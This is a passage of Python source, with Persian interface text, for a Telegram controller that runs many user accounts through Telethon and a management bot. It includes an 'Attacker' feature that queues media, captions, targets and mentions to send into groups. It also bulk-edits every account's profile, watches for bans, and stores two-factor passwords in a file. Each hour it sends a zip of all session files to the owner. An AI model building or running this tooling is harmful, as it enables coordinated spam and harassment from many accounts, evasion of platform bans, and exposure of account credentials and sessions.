              f" بیو همه اکانت‌ها تغییر کرد!\nموفق: {ok}  ناموفق: {fail}",
              buttons=[[Button.inline("🔙 Back", b"gprf_all"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── profile: name ─────────────────────────────────────
      if step == "prfname":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if not meta:
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_profile")]])
              return
          parts = text.split(None, 1)
          fname = parts[0]
          lname = parts[1] if len(parts) > 1 else ""
          try:
              await meta["client"](functions.account.UpdateProfileRequest(
                    first_name=fname, last_name=lname))
              await sp(event.chat_id, f" نام {sess} تغییر کرد: {fname} {lname}",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          return

      # ── profile: bio ──────────────────────────────────────
      if step == "prfbio":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          group_pending.pop(uid, None)
          if not meta:
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_profile")]])
              return
          try:
              await meta["client"](functions.account.UpdateProfileRequest(about=text[:70]))
              await sp(event.chat_id, f" بیو {sess} تغییر کرد.",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          return

      # ── attacker media upload ─────────────────────────────
      if step in ("atk_media_photo", "atk_media_gif", "atk_media_video", "atk_media_sticker"):
          if text == "/done":
              group_pending.pop(uid, None)
              atk = groups_db.get(group_name, {}).get("attacker", {})
              cnt = sum(1 for i in atk.get("items", []) if i["type"] != "text")
              await sp(event.chat_id, f" {cnt} مدیا برای Attacker ثبت شد.",
                        buttons=[[Button.inline("⚔️ Attacker", b"g_atk")]])
              return
          mtype_map = {"atk_media_photo":   ("photo",   "jpg"),
                         "atk_media_gif":     ("gif",     "gif"),
                         "atk_media_video":   ("video",   "mp4"),
                         "atk_media_sticker": ("sticker", "webp")}
          mtype, ext = mtype_map[step]
          is_sticker = step == "atk_media_sticker"
          media_obj = (event.sticker if is_sticker else None) or \
                        event.photo or event.gif or event.video or event.document
          if not media_obj:
              await sp(event.chat_id, " فایل بفرست یا /done برای پایان:")
              return
          try:
              os.makedirs("atk_media", exist_ok=True)
              import time as _t2
              fname = f"atk_media/{group_name}_{int(_t2.time())}.{ext}"
              file_bytes = await bot.download_media(media_obj, bytes)
              with open(fname, "wb") as fo:
                    fo.write(file_bytes)
              if is_sticker:
                    # stickers don't need caption — save immediately
                    atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
                        "active": False, "target": "", "items": [], "delay": 2, "mention_ids": []})
                    atk.setdefault("items", []).append({"type": "sticker", "val": fname})
                    save_groups()
                    cnt = sum(1 for i in atk["items"] if i["type"] == "sticker")
                    await sp(event.chat_id, f" استیکر #{cnt} ثبت شد. ادامه یا /done:")
              else:
                    # ask for caption before saving
                    group_pending[uid] = {
                        "step": "atk_media_caption",
                        "group": group_name,
                        "file": fname, "mtype": mtype, "orig_step": step,
                    }
                    existing_cap = (event.message.message or "") if event.message else ""
                    prompt = f" کپشن برای این {mtype} بنویس:\n(یا /skip برای بدون کپشن)"
                    if existing_cap:
                        prompt += f"\n کپشن فعلی: «{existing_cap}»"
                    await sp(event.chat_id, prompt,
                            buttons=[[Button.inline("❌ Cancel", b"g_atk")]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}")
          return

      # ── attacker media caption ────────────────────────────
      if step == "atk_media_caption":
          group_pending.pop(uid, None)
          fname = pend.get("file", "")
          mtype = pend.get("mtype", "photo")
          orig_step = pend.get("orig_step", f"atk_media_{mtype}")
          caption = "" if text in ("/skip", "/done") else text
          atk = groups_db.setdefault(group_name, {}).setdefault("attacker", {
              "active": False, "target": "", "items": [], "delay": 2, "mention_ids": []})
          atk.setdefault("items", []).append({"type": mtype, "val": fname, "caption": caption})
          save_groups()
          cnt = sum(1 for i in atk["items"] if i["type"] == mtype)
          # go back to uploading more of same type
          group_pending[uid] = {"step": orig_step, "group": group_name}
          await sp(event.chat_id,
              f" {mtype} #{cnt} با کپشن «{caption or '—'}» ثبت شد.\nادامه بفرست یا /done:",
              buttons=[[Button.inline("🔘 Exit", b"g_atk")]])
          return

      # ── self media upload (photo/gif/video/sticker) ───────
      if step in ("self_media", "self_upload_photo", "self_upload_gif",
                    "self_upload_video", "self_upload_sticker"):
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          if not meta:
              group_pending.pop(uid, None)
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_enemy")]])
              return

          if text == "/done":
              group_pending.pop(uid, None)
              cnt = len(meta["state"].get("self_reply_media", []))
              save_session_state(sess, meta["state"])
              await sp(event.chat_id, f" {cnt} مدیا Self ثبت شد.",
                        buttons=[[Button.inline(f"🗂 {sess}", f"gen_{sess}".encode()),
                                  Button.inline("📋 Menu", b"g_home")]])
              return

          # detect media type
          is_sticker = (event.sticker is not None) if hasattr(event, 'sticker') else False
          media_obj = (event.sticker if is_sticker else None) or \
                        event.photo or event.gif or event.video or \
                        (event.document if event.document else None)

          if not media_obj:
              await sp(event.chat_id, " مدیا بفرست یا /done برای پایان:")
              return

          try:
              # determine type from step or auto-detect
              if step == "self_upload_photo":
                    mtype = "photo"
                    ext = "jpg"
              elif step == "self_upload_gif":
                    mtype = "gif"
                    ext = "gif"
              elif step == "self_upload_video":
                    mtype = "video"
                    ext = "mp4"
              elif step == "self_upload_sticker":
                    mtype = "sticker"
                    ext = "webp"
              else:
                    if is_sticker:
                        mtype, ext = "sticker", "webp"
                    elif event.photo:
                        mtype, ext = "photo", "jpg"
                    elif event.gif:
                        mtype, ext = "gif", "gif"
                    elif event.video:
                        mtype, ext = "video", "mp4"
                    else:
                        mtype, ext = "photo", "bin"

              os.makedirs("self_media", exist_ok=True)
              idx = len(meta["state"].get("self_reply_media", []))
              local_path = f"self_media/{sess}_{idx}.{ext}"
              file_bytes = await bot.download_media(media_obj, bytes)
              with open(local_path, "wb") as f_out:
                    f_out.write(file_bytes)
              if is_sticker:
                    # stickers don't need caption — save immediately
                    meta["state"].setdefault("self_reply_media", []).append(
                        {"path": local_path, "type": "sticker", "caption": ""})
                    cnt = len(meta["state"]["self_reply_media"])
                    save_session_state(sess, meta["state"])
                    group_pending[uid] = {"step": step, "sess": sess, "group": group_name}
                    await sp(event.chat_id,
                        f" استیکر #{cnt} ثبت شد. ادامه بفرست یا /done:",
                        buttons=[[Button.inline("🔘 Exit", f"gen_{sess}".encode())]])
              else:
                    caption_txt = (event.message.message or "") if event.message else ""
                    group_pending[uid] = {
                        "step": "self_media_caption",
                        "sess": sess, "group": group_name,
                        "file": local_path, "mtype": mtype,
                    }
                    prompt = f" کپشن برای این {mtype} بنویس:\n(یا /skip برای بدون کپشن)"
                    if caption_txt:
                        prompt += f"\n کپشن فعلی: «{caption_txt}»"
                    await sp(event.chat_id, prompt,
                        buttons=[[Button.inline("❌ Cancel", f"gen_{sess}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}")
          return

      # ── self media caption step ───────────────────────────
      if step == "self_media_caption":
          sess = pend.get("sess", "")
          meta = managed.get(sess)
          local_path = pend.get("file", "")
          mtype = pend.get("mtype", "photo")
          group_pending.pop(uid, None)
          if meta and local_path:
              caption_txt = "" if text in ("/skip", "/done") else text
              meta["state"].setdefault("self_reply_media", []).append(
                    {"path": local_path, "type": mtype, "caption": caption_txt})
              cnt = len(meta["state"]["self_reply_media"])
              save_session_state(sess, meta["state"])
              # remain in self_media step so they can add more
              group_pending[uid] = {"step": "self_media", "sess": sess, "group": group_name}
              await sp(event.chat_id,
                    f" {mtype} #{cnt} با کپشن «{caption_txt or '—'}» ثبت شد.\n"
                    f"ادامه بفرست یا /done:",
                    buttons=[[Button.inline("🔘 Exit", f"gen_{sess}".encode())]])
          return

      # ── profile photo all accounts ────────────────────────
      if step == "prfphoto_all":
          photo_obj = event.photo or (event.document if event.document and getattr(event.document, 'mime_type', '').startswith('image/') else None)
          if not photo_obj:
              await sp(event.chat_id, " عکس بفرست (یا /cancel برای لغو):",
                        buttons=[[Button.inline("❌ Cancel", b"gprf_all")]])
              return
          group_pending.pop(uid, None)
          import io
          from telethon.tl.functions.photos import UploadProfilePhotoRequest
          photo_bytes = await bot.download_media(photo_obj, bytes)
          ok = fail = 0
          sessions_list = grp_sessions()
          online_list = [s for s in sessions_list if s in managed]
          if not online_list:
              await sp(event.chat_id, " هیچ اکانت آنلاینی نیست.",
                        buttons=[[Button.inline("🔙 Back", b"gprf_all")]])
              return
          await sp(event.chat_id, f" در حال تغییر عکس {len(online_list)} اکانت...")
          for sess in online_list:
              meta = managed.get(sess)
              if not meta:
                    continue
              try:
                    file = await meta["client"].upload_file(io.BytesIO(photo_bytes), file_name="photo.jpg")
                    await meta["client"](UploadProfilePhotoRequest(file=file))
                    ok += 1
                    await asyncio.sleep(3)
              except Exception:
                    fail += 1
          await sp(event.chat_id,
              f" عکس پروفایل همه اکانت‌ها تغییر کرد!\n موفق: {ok}   ناموفق: {fail}",
              buttons=[[Button.inline("🔙 Back", b"gprf_all"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── profile photo handler for group bot ───────────────
      if step == "prfphoto":
          sess = pend.get("sess", "")
          group_pending.pop(uid, None)
          if not event.photo:
              await sp(event.chat_id, " عکس بفرست",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
              return
          meta = managed.get(sess)
          if not meta:
              await sp(event.chat_id, f" {sess} آفلاینه",
                        buttons=[[Button.inline("🔙 Back", b"g_profile")]])
              return
          try:
              photo_bytes = await bot.download_media(event.photo, bytes)
              import io
              file = await meta["client"].upload_file(io.BytesIO(photo_bytes), file_name="photo.jpg")
              from telethon.tl.functions.photos import UploadProfilePhotoRequest
              await meta["client"](UploadProfilePhotoRequest(file=file))
              await sp(event.chat_id, f" عکس پروفایل {sess} تغییر کرد!",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          except Exception as e:
              await sp(event.chat_id, f" خطا: {e}",
                        buttons=[[Button.inline("🔙 Back", f"gprf_{sess}".encode())]])
          return

      # ── action target input ───────────────────────────────
      if step == "g_act_target":
          group_pending.pop(uid, None)
          groups_db.setdefault(group_name, {})["action_target"] = text.strip()
          save_groups()
          await sp(event.chat_id,
              f" گپ هدف اکشن تنظیم شد:\n{text.strip()}",
              buttons=[[Button.inline("⚡ Action Panel", b"g_action"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── bulk self text input ──────────────────────────────
      if step == "g_bulk_text":
          group_pending.pop(uid, None)
          sessions = grp_sessions()
          cnt = 0
          for s in sessions:
              meta = managed.get(s)
              if meta:
                    meta["state"].setdefault("self_reply_text", []).append(text)
                    save_session_state(s, meta["state"])
                    cnt += 1
          total = len(managed.get(sessions[0], {}).get("state", {}).get("self_reply_text", [])) if sessions else 0
          await sp(event.chat_id,
              f" متن برای {cnt} سشن اضافه شد.\nهر سشن الان {total} متن داره.",
              buttons=[[Button.inline("🔙 Bulk Back", b"g_self_bulk"),
                          Button.inline("📋 Menu", b"g_home")]])
          return

      # ── Admin add (owner only) ─────────────────────────────
      if step == "adm_add":
          group_pending.pop(uid, None)
          if not is_grp_owner(uid):
              await sp(event.chat_id, " فقط اونر گروه میتونه ادمین اضافه کنه",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
              return
          try:
              new_adm = int(text)
              groups_db.setdefault(group_name, {}).setdefault("bot_admins", [])
              if new_adm not in groups_db[group_name]["bot_admins"]:
                    groups_db[group_name]["bot_admins"].append(new_adm)
                    save_groups()
              await sp(event.chat_id, f" ادمین {new_adm} اضافه شد.",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
          except ValueError:
              await sp(event.chat_id, " آیدی باید عدد باشه",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
          return

      # ── Admin del (owner only) ─────────────────────────────
      if step == "adm_del":
          group_pending.pop(uid, None)
          if not is_grp_owner(uid):
              await sp(event.chat_id, " فقط اونر گروه میتونه ادمین حذف کنه",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
              return
          try:
              del_adm = int(text)
              admins = groups_db.get(group_name, {}).get("bot_admins", [])
              if del_adm in admins:
                    admins.remove(del_adm)
                    save_groups()
              await sp(event.chat_id, f" ادمین {del_adm} حذف شد.",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
          except ValueError:
              await sp(event.chat_id, " آیدی باید عدد باشه",
                        buttons=[[Button.inline("🔙 Back", b"g_admins")]])
          return


async def initial_terminal_flow() -> None:
    global first_worker_userid, first_worker_name
    if sessions_db:
      return
    print("No sessions found. Creating FIRST session via terminal.")
    phone = input("Enter phone for FIRST session (e.g. +989xxxxxxxxx): ").strip()
    session_name = generate_next_session_name()
    tmp = _make_client(sess_path(session_name), session_name=session_name)
    try:
      await tmp.connect()
      await tmp.send_code_request(phone)
      code = input("Enter the code sent to phone: ").strip()
      try:
          await tmp.sign_in(phone=phone, code=code)
      except SessionPasswordNeededError:
          pwd = input("Two-step password required. Enter password: ").strip()
          await tmp.sign_in(password=pwd)
          save_2fa_to_file(session_name, phone, pwd)
      me = await tmp.get_me()
      first_worker_userid = me.id
      first_worker_name = session_name
      sessions_db[session_name] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": [], "is_first": True}
      save_db()
      await tmp.disconnect()
      await start_worker(session_name, phone=phone)
      log.warning(f"First session created: {session_name} (user={first_worker_userid})")
    except Exception as e:
      log.warning(f"initial flow error: {e}")
      try:
          await tmp.disconnect()
      except Exception:
          pass

async def startup_existing_sessions() -> None:
    disabled_to_protect = []
    for name, info in sessions_db.items():
      if name in manually_disabled:
          log.warning(f"[startup] {name} is manually disabled — skipping")
          disabled_to_protect.append(name)
          continue
      session_file = os.path.join(SESSIONS_DIR, f"{name}.session")
      if os.path.exists(session_file):
          try:
              await start_worker(name, phone=info.get("phone"))
              await asyncio.sleep(1.5)   # stagger: avoid simultaneous SQLite access
          except Exception as e:
              log.warning(f"Error starting {name}: {e}")
    # اگه burn یا guard از قبل روشن بوده، protected client برای سشن‌های خاموش بساز
    if OTP_BURN_MODE or SESSION_GUARD_ENABLED:
      for name in disabled_to_protect:
          await start_protected_client(name)
          await asyncio.sleep(1.0)
    # start dedicated group bots for groups that have bot_token set
    for gname, ginfo in groups_db.items():
      if ginfo.get("bot_token"):
          try:
              await start_group_bot(gname)
              await asyncio.sleep(1.0)
          except Exception as e:
              log.warning(f"Error starting group bot [{gname}]: {e}")

async def main() -> None:
    global main_client, bot_client
    # fingerprints باید قبل از هر _make_client لود بشن تا داده‌های قبلی از بین نرن
    load_fingerprints()
    load_privacy_hardening_setting()
    main_client = _make_client(sess_path(MAIN_SESSION), session_name=MAIN_SESSION)
    # از MemorySession برای bot استفاده می‌کنیم تا درگیر SQLite lock نشه
    # bot token همیشه موجوده و نیازی به persist کردن session file نیست
    if BOT_TOKEN:
        from telethon.sessions import MemorySession as _BotMemSess
        bot_client = TelegramClient(_BotMemSess(), API_ID, API_HASH,
                                    connection_retries=10, retry_delay=2)
    else:
        bot_client = None
    load_db()
    # Auto-create owner remote "x" if owner has no remotes yet
    owner_groups_exist = [g for g, info in groups_db.items() if int(info.get("owner", 0)) == OWNER_ID]
    if not owner_groups_exist:
      default_name = "x"
      if default_name not in groups_db:
          groups_db[default_name] = {"owner": OWNER_ID, "sessions": [], "owner_only_first": True}
          save_groups()
          log.warning("Auto-created owner remote 'x'")
    main_authorized = False
    try:
      await main_client.connect()
      if await main_client.is_user_authorized():
          main_authorized = True
          # preload dialogs so entity cache is populated
          try:
              async for _ in main_client.iter_dialogs(limit=50):
                    pass
          except Exception as e:
              log.warning(f"Dialog preload error: {e}")
          # send "online" notification to owner on startup
          try:
              await main_client.send_message(OWNER_ID, "online")
              log.warning(f"Sent online notification to owner {OWNER_ID}")
          except Exception as e:
              log.warning(f"Could not send online notification: {e}")
          attach_handlers(main_client, MAIN_SESSION, load_session_state(MAIN_SESSION), is_main=True)
      else:
          log.warning("Main session not authorized — skipping. Add accounts via the management bot.")
    except Exception as e:
      log.warning(f"Main client connect error: {e}")

    await startup_existing_sessions()
    # start management bot if token provided
    if BOT_TOKEN and bot_client:
      try:
          await bot_client.start(bot_token=BOT_TOKEN)
          attach_bot_handlers(bot_client)
          # ── Monkey-patch: همه send_message/edit_message های بات رو
          # به صورت خودکار از _apply_custom_emoji رد کن ──────────────
          _orig_send = bot_client.send_message
          _orig_edit = bot_client.edit_message

          async def _prem_send(entity, message=None, **kwargs):
              if isinstance(message, str) and message and 'formatting_entities' not in kwargs:
                    _pm = kwargs.pop('parse_mode', None)
                    _txt = message
                    if _pm and str(_pm).lower() == 'html':
                        pass  # already HTML — _apply_custom_emoji handles HTML
                    _plain, _ents = _apply_custom_emoji(_txt)
                    if _ents:
                        return await _orig_send(entity, _plain, formatting_entities=_ents, **kwargs)
                    return await _orig_send(entity, _plain, **kwargs)
              return await _orig_send(entity, message, **kwargs)

          async def _prem_edit(entity, message=None, text=None, **kwargs):
              _txt = text if text is not None else message
              if isinstance(_txt, str) and _txt and 'formatting_entities' not in kwargs:
                    _pm = kwargs.pop('parse_mode', None)
                    if _pm and str(_pm).lower() == 'html':
                        pass
                    _plain, _ents = _apply_custom_emoji(_txt)
                    if _ents:
                        if text is not None:
                            return await _orig_edit(entity, text=_plain, formatting_entities=_ents, **kwargs)
                        return await _orig_edit(entity, _plain, formatting_entities=_ents, **kwargs)
                    if text is not None:
                        return await _orig_edit(entity, text=_plain, **kwargs)
                    return await _orig_edit(entity, _plain, **kwargs)
              return await _orig_edit(entity, message, text=text, **kwargs)

          bot_client.send_message = _prem_send
          bot_client.edit_message = _prem_edit
          # ───────────────────────────────────────────────────────────
          log.warning("Management bot started successfully.")
          # notify owner via bot that it's online — at most once per hour
          try:
              import time as _time
              _notify_flag = os.path.join(DATA_DIR, ".last_startup_notify")
              _now = _time.time()
              _last = 0.0
              try:
                    with open(_notify_flag) as _f:
                        _last = float(_f.read().strip())
              except Exception:
                    pass
              if _now - _last >= 3600:
                    await bot_client.send_message(OWNER_ID, "<spoiler> ربات مدیریت آنلاین شد!\nبرای راهنما بنویسید: /start</spoiler>", parse_mode="html")
                    with open(_notify_flag, "w") as _f:
                        _f.write(str(_now))
          except Exception:
              pass
      except Exception as e:
          log.warning(f"Bot client start error: {e}")
    # run clients concurrently + keep-alive + auto-reconnect
    # ── آخرین بار که پینگ موفق بود ──
    _bot_last_ping: list = [time.monotonic()]   # list تا closure بتونه مقدار رو عوض کنه

    async def _run_bot_forever():
      """Keep bot connected — reconnect automatically if it drops."""
      while True:
          try:
              if bot_client and bot_client.is_connected():
                    await bot_client.run_until_disconnected()
          except Exception as e:
              log.warning(f"[bot] disconnected: {e}")
          await asyncio.sleep(5)
          try:
              if bot_client:
                    await bot_client.start(bot_token=BOT_TOKEN)
                    _bot_last_ping[0] = time.monotonic()
                    log.warning("[bot] reconnected")
          except Exception as e:
              log.warning(f"[bot] reconnect error: {e}")

    async def _bot_ping_watchdog():
      """
      هر ۶۰ ثانیه به Telegram پینگ می‌زنه.
      اگه پینگ fail شد یا ۳ دقیقه بدون جواب گذشت،
      اتصال رو قطع می‌کنه تا _run_bot_forever دوباره وصل بشه.
      """
      PING_INTERVAL = 60        # هر چند ثانیه پینگ بزن
      DEAD_THRESHOLD = 180      # اگه ۳ دقیقه بدون پینگ موفق، اجبار به reconnect
      await asyncio.sleep(30)   # صبر کن ربات کامل بالا بیاد
      while True:
          await asyncio.sleep(PING_INTERVAL)
          if not bot_client:
              continue
          try:
              await asyncio.wait_for(bot_client.get_me(), timeout=20)
              _bot_last_ping[0] = time.monotonic()
          except Exception as ping_err:
              log.warning(f"[bot-watchdog] ping failed: {ping_err}")
              # اگه خیلی وقته پینگ موفق نداشتیم، اجبار به disconnect
              if time.monotonic() - _bot_last_ping[0] >= DEAD_THRESHOLD:
                  log.warning("[bot-watchdog] bot appears frozen — forcing reconnect")
                  try:
                      await bot_client.disconnect()
                  except Exception:
                      pass
                  _bot_last_ping[0] = time.monotonic()  # reset تا دوباره حلقه disconnect نخوره

    tasks = []
    if main_authorized:
      tasks.append(asyncio.ensure_future(main_client.run_until_disconnected()))
    if BOT_TOKEN and bot_client:
      tasks.append(asyncio.ensure_future(_run_bot_forever()))
      tasks.append(asyncio.ensure_future(_bot_ping_watchdog()))
    tasks.append(asyncio.ensure_future(keep_alive_server()))
    tasks.append(asyncio.ensure_future(auto_reconnect_loop()))
    tasks.append(asyncio.ensure_future(auto_backup_loop()))
    tasks.append(asyncio.ensure_future(log_reporter_loop()))
    tasks.append(asyncio.ensure_future(anti_ban_watchdog_loop()))
    tasks.append(asyncio.ensure_future(attacker_watchdog_loop()))
    tasks.append(asyncio.ensure_future(ghost_mode_loop()))
    # auto_scan_trusted_devices حذف شد
    # watchdog: protected client های قطع‌شده رو reconnect می‌کنه (burn/guard روی سشن‌های خاموش)
    asyncio.create_task(protected_clients_watchdog())
    # burn pool: از همون ابتدا _BURN_POOL_SIZE کلاینت گرم نگه می‌داریم
    asyncio.create_task(_ensure_burn_client_prewarmed())
    # db flush loop: هر ۵۰۰ms dirty flag رو چک می‌کنه و اگه لازم بود در thread می‌نویسه
    asyncio.create_task(_db_flush_loop())
    if not tasks:
      log.warning("No Telegram clients running. Provide a BOT_TOKEN or authorize main session.")
    try:
      await asyncio.gather(*tasks, return_exceptions=True)
    except Exception:
      pass

async def keep_alive_server() -> None:
    """Simple HTTP server on port 5000 to keep Replit alive."""
    from aiohttp import web
    async def handle(request):
      return web.Response(text="OK", status=200)
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ping", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    try:
      site = web.TCPSite(runner, "0.0.0.0", 5000)
      await site.start()
      log.warning("Keep-alive server started on port 5000")
    except OSError:
      log.warning("Keep-alive server: port 5000 already in use, skipping")
      await runner.cleanup()
      # just sleep forever so gather doesn't exit
      while True:
          await asyncio.sleep(3600)
      return
    while True:
      await asyncio.sleep(3600)

async def auto_backup_loop() -> None:
    """Every 1 hour, send a full ZIP backup (source + data + sessions) to owner."""
    import zipfile, io, time as _time
    BACKUP_INTERVAL = 3600          # 1 hour in seconds
    LAST_BACKUP_FILE = "data/.last_backup_ts"
    LAST_BACKUP_MSG_FILE = "data/.last_backup_msg_id"

    def _last_backup_ts() -> float:
      try:
          with open(LAST_BACKUP_FILE, "r", encoding="utf-8") as _f:
              return float(_f.read().strip())
      except Exception:
          return 0.0

    def _save_backup_ts() -> None:
      try:
          with open(LAST_BACKUP_FILE, "w", encoding="utf-8") as _f:
              _f.write(str(_time.time()))
      except Exception as e:
          log.warning(f"[auto-backup] _save_backup_ts error: {e}")

    def _load_last_msg_id() -> int:
      try:
          with open(LAST_BACKUP_MSG_FILE, "r", encoding="utf-8") as _f:
              return int(_f.read().strip())
      except Exception:
          return 0

    def _save_last_msg_id(msg_id: int) -> None:
      try:
          with open(LAST_BACKUP_MSG_FILE, "w", encoding="utf-8") as _f:
              _f.write(str(msg_id))
      except Exception as e:
          log.warning(f"[auto-backup] _save_last_msg_id error: {e}")

    # wait until 1 hour has passed since last backup
    elapsed = _time.time() - _last_backup_ts()
    wait_secs = max(0, BACKUP_INTERVAL - elapsed)
    if wait_secs > 0:
      await asyncio.sleep(wait_secs)

    while True:
      try:
          client = None
          if bot_client and bot_client.is_connected():
              client = bot_client
          elif main_client and main_client.is_connected():
              client = main_client
          if client:
              now_str = datetime.now(IRAN_TZ).strftime("%Y-%m-%d_%H-%M")
              buf = io.BytesIO()
              buf.name = f"backup_{now_str}.zip"
              total_files = 0
              with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    # سورس اصلی
                    if os.path.exists(_SCRIPT_PATH):
                        zf.write(_SCRIPT_PATH, "eliot_bot.py")
                        total_files += 1
                    # requirements
                    if os.path.exists("requirements.txt"):
                        zf.write("requirements.txt", "requirements.txt")
                        total_files += 1
                    # فایل‌های دیتا (data/)
                    for fname in (SESSIONS_DB, GROUPS_DB, TWOFA_LOG, BLACKLIST_DB):
                        if os.path.exists(fname):
                            zf.write(fname, fname)
                            total_files += 1
                    # فایل‌های سشن (sessions/*.session و sessions/*_state.json)
                    # cap: skip individual files >20MB to avoid OOM with 100+ sessions
                    MAX_FILE_BYTES = 20 * 1024 * 1024
                    if os.path.isdir(SESSIONS_DIR):
                        for fn in os.listdir(SESSIONS_DIR):
                            fpath = os.path.join(SESSIONS_DIR, fn)
                            if os.path.isfile(fpath):
                                try:
                                    if os.path.getsize(fpath) <= MAX_FILE_BYTES:
                                        zf.write(fpath, fpath)
                                        total_files += 1
                                    else:
                                        log.warning(f"[auto-backup] skipping oversized file: {fn}")
                                except Exception:
                                    pass
              buf.seek(0)
              zip_size_kb = buf.getbuffer().nbytes // 1024
              caption = (
                    f" بکاپ کامل خودکار\n"
                    f"━━━━━━━━━━━━━━\n"
                    f" زمان: {datetime.now(IRAN_TZ).strftime('%Y-%m-%d %H:%M')}\n"
                    f" تعداد فایل: {total_files}\n"
                    f" حجم: {zip_size_kb:,} KB\n\n"
                    f" شامل: سورس + دیتا + سشن‌ها\n"
                    f" برای اجرا: python eliot_bot.py"
              )
              # حذف پیام بکاپ قبلی از پیوی
              last_msg_id = _load_last_msg_id()
              if last_msg_id:
                    try:
                        await client.delete_messages(OWNER_ID, [last_msg_id])
                        log.warning(f"[auto-backup] deleted previous backup message id={last_msg_id}")
                    except Exception as del_e:
                        log.warning(f"[auto-backup] could not delete previous message: {del_e}")
              # ارسال بکاپ جدید
              sent_msg = await client.send_file(
                    OWNER_ID, buf,
                    caption=caption,
                    force_document=True
              )
              _save_last_msg_id(sent_msg.id)
              log.warning(f"[auto-backup] full ZIP sent to owner ({total_files} files, {zip_size_kb}KB) at {now_str}")
              _save_backup_ts()
              # حذف zipFile.zip از دایرکتوری اگر وجود داشت
              for _zip_candidate in ("zipFile.zip", "zipfile.zip", "ZipFile.zip"):
                    if os.path.exists(_zip_candidate):
                        try:
                            os.remove(_zip_candidate)
                            log.warning(f"[auto-backup] deleted local zip file: {_zip_candidate}")
                        except Exception as rm_e:
                            log.warning(f"[auto-backup] could not delete {_zip_candidate}: {rm_e}")
      except Exception as e:
          log.warning(f"[auto-backup] error: {e}")
      await asyncio.sleep(BACKUP_INTERVAL)

async def anti_ban_watchdog_loop() -> None:
    """Every 60s, ping each managed session; on ban/deactivation → disconnect & notify owner."""
    from telethon.errors import (
      UserDeactivatedBanError, AuthKeyUnregisteredError,
      SessionRevokedError, UserRestrictedError, PhoneNumberBannedError,
      AuthKeyDuplicatedError,
    )
    BAN_ERRORS = (
      UserDeactivatedBanError, AuthKeyUnregisteredError,
      SessionRevokedError, PhoneNumberBannedError, AuthKeyDuplicatedError,
    )
    CHECK_INTERVAL = 60  # seconds between checks per session
    last_check: Dict[str, float] = {}
    import time as _t

    await asyncio.sleep(30)  # startup grace period

    async def _check_one_ban(sess_name: str) -> None:
        """آنتی‌بن برای یک سشن — داخل سمافور اجرا میشه."""
        async with _TG_API_SEM:
            meta = managed.get(sess_name)
            if not meta:
                return
            client = meta["client"]
            try:
                if not client.is_connected():
                    return
                await client.get_me()
            except BAN_ERRORS as e:
                ban_type = type(e).__name__
                log.warning(f"[anti-ban] {sess_name} BANNED: {ban_type}")
                try:
                    await client.disconnect()
                except Exception:
                    pass
                managed.pop(sess_name, None)
                anti_ban_notified.add(sess_name)
                msg = (
                    f" آنتی‌بن هشدار!\n"
                    f"━━━━━━━━━━━━━━\n"
                    f" سشن: {sess_name}\n"
                    f" نوع: {ban_type}\n"
                    f" زمان: {datetime.now(IRAN_TZ).strftime('%H:%M:%S')}\n"
                    f" سشن آفلاین شد."
                )
                try:
                    notify_client = (bot_client if bot_client and bot_client.is_connected()
                                     else main_client if main_client and main_client.is_connected()
                                     else None)
                    if notify_client:
                        await notify_client.send_message(OWNER_ID, msg)
                except Exception as ne:
                    log.warning(f"[anti-ban] notify error: {ne}")
            except UserRestrictedError:
                if sess_name not in anti_ban_notified:
                    anti_ban_notified.add(sess_name)
                    msg = (
                        f" آنتی‌بن هشدار محدودیت!\n"
                        f"━━━━━━━━━━━━━━\n"
                        f" سشن: {sess_name}\n"
                        f" اکانت محدود شده (Restricted)\n"
                        f" زمان: {datetime.now(IRAN_TZ).strftime('%H:%M:%S')}"
                    )
                    try:
                        notify_client = (bot_client if bot_client and bot_client.is_connected()
                                         else main_client if main_client and main_client.is_connected()
                                         else None)
                        if notify_client:
                            await notify_client.send_message(OWNER_ID, msg)
                    except Exception:
                        pass
            except Exception:
                pass

    while True:
        now = _t.time()
        due = [sn for sn in list(managed.keys())
               if anti_ban_enabled.get(sn, True)
               and now - last_check.get(sn, 0) >= CHECK_INTERVAL]
        for sn in due:
            last_check[sn] = now
        if due:
            await asyncio.gather(*[_check_one_ban(sn) for sn in due], return_exceptions=True)
        await asyncio.sleep(5)


async def log_reporter_loop() -> None:
    """Every 5 minutes, send in-memory log buffer as TXT to owner, delete previous TXT."""
    import logging as _logging, io as _io, time as _rtime
    LOG_INTERVAL = 300  # 5 minutes

    class _MemHandler(_logging.Handler):
      def __init__(self):
          super().__init__()
          self._lines = []
      def emit(self, record):
          try:
              self._lines.append(self.format(record))
              if len(self._lines) > 5000:
                    self._lines = self._lines[-4000:]
